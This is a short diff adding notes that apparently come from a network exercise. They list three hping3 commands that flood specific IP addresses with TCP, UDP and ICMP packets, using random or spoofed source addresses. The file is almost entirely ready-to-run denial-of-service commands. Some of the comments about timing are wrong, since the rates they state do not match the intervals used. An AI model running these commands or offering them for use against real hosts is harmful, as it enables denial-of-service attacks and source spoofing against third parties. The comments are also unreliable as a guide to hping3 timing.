@@ -1,0 +1,9 @@
+1.# -c 10000 packets from a ran source to a port to this port
+hping3 -c 10000 --rand-source --faster -p 80 138.197.149.203
+
+2) 9,000 UDP packets in a span of 90 seconds from a spoofed source address
+hping3 --udp -c 9000 -i u10000 --spoof 165.227.37.161 138.197.147.20
+
+3) 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second
+u1000 => 1 second
+hping3 --icmp --count 11000 --data 1000 --interval u14600 --spoof 165.227.37.161 138.197.147.20
